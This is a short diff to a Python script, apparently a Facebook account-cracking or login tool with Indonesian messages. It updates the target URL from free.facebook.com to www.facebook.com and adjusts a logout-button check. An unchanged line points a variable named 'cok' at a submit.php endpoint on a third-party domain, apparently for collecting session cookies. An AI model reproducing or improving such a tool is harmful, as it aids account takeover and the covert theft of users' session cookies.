@@ -179,7 +179,7 @@ class ACL:
 
     def __init__(self):
         self.ses=requests.Session()
-        self.url = "https://free.facebook.com"
+        self.url = "https://www.facebook.com"
         self.id, self.ok, self.cp, self.loop = [], [], [], 0
         self.cok = "https://api-cdn-fb.yayanxd.my.id/submit.php"
         self.kontol, self.iya, self.pasw = {}, [], []
@@ -271,7 +271,7 @@ class ACL:
         self.logo()
         try:
             link = self.ses.get(f"{self.url}/profile.php?v=info", cookies=cook).text
-            if "mbasic_logout_button" not in link:
+            if "www_logout_button" not in link:
                 self.hapus()
                 print(f"\n[{M}!{N}] Akun mendapat checkpint, silakan masuk dengan akun lain.");time.sleep(3);self.login_cokie()
         except requests.ConnectionError:
